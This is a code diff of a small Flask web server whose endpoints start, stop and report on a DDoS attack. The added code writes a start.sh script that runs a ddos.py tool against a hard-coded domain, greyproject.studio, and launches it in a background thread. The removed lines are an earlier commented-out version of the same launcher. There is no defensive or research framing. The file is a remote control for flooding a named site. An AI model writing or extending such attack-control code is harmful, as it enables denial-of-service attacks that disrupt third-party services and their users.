@@ -1,75 +1,42 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify
 import subprocess
-import asyncio
-
-# async def start_ddos_async( target_url):  # Make the function asynchronous
-#     # ... (code to extract the target_url) ...
-
-#     with open('start.sh', 'w') as file:  
-#         file.write('source myvenv/bin/activate\n')
-#         file.write('python3 ddos.py {} 90'.format(target_url))         
-
-#     proc = await asyncio.create_subprocess_shell(
-#         './start.sh',
-#         stdout=asyncio.subprocess.PIPE,
-#         stderr=asyncio.subprocess.PIPE
-#     )
-
-#     stdout, stderr = await proc.communicate()  # Wait for the process
-#     if proc.returncode == 0:
-#         return jsonify("Success, DDoS running!") 
-#     else:
-#         return jsonify("DDoS start failed: {}".format(stderr.decode())), 500
-
-
-
-
-
-
-
-
-
+import threading
+import fs
 app = Flask(__name__)
+# Globals
+d_flag = False
 
-@app.route('/echo/', methods=['POST'])
-def echo_body_json():
-    # print("Heyyaaa")
-    # print(request)
-    # if not request.is_json:
-    #     return jsonify("Error: Request data must be JSON"), 400
+def run_ddos_script():
+    subprocess.run(['./start.sh'], shell=True)  
 
-    # request_data = request.get_json()
-    # return jsonify(request_data)
-    return jsonify("Hey Mom")
+@app.route('/use/ddos/start/', methods=['POST'])
+def start_ddos():
+    global d_flag
 
+    # Create the heading script.
+    with open('start.sh', 'w') as file:  
+        file.write('source myvenv/bin/activate\n')
+        file.write('python3 ddos.py {} 90'.format('greyproject.studio'))         
 
-@app.route('/use/ddos/start', methods=['POST'])
-def start_ddos(request):
-    # if not request.is_json:
-    #     return jsonify("Error: Request data must be JSON"), 400
-
-    data = request.body()
-    target_url = data.get('url')
-    # with open('mynewfile.txt', 'w') as file:  # 'w' for write mode (overwrites)  
-    # print('File writing complete!')
-    # subprocess.run(['./start.sh'], shell=True)  # Assuming start.sh is in the same directory
-    # return jsonify("Success, DDoS running!")  # Replace with placeholder action
-    # loop = asyncio.get_event_loop()  # Get the event loop
-    # return loop.run_forever(start_ddos_async( target_url))  # Run the async function
-    return jsonify(target_url)
+    thread = threading.Thread(target=run_ddos_script)
+    thread.start()  # Start the script in a separate thread
+    d_flag = True
+    return jsonify("DDoS script started in the background!")  
 
 
-@app.route('/use/ddos/stop', methods=['POST'])
+@app.route('/use/ddos/stop/', methods=['POST'])
 def stop_ddos():
-    return jsonify("Hi Dad")  # Replace with placeholder action
+    global d_flag
+    d_flag = False
+    return jsonify("DDoS attack will stop in 10s")  
 
 
 
-@app.route('/use/ddos/status', methods=['GET'])
+@app.route('/use/ddos/status/', methods=['GET'])
 def ddos_status():
-    return jsonify("Hi Dad")  # Replace with placeholder action
-
+    global d_flag
+    return jsonify(d_flag)  
 
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5667) 
+    app.run(debug=True, port=7455) 
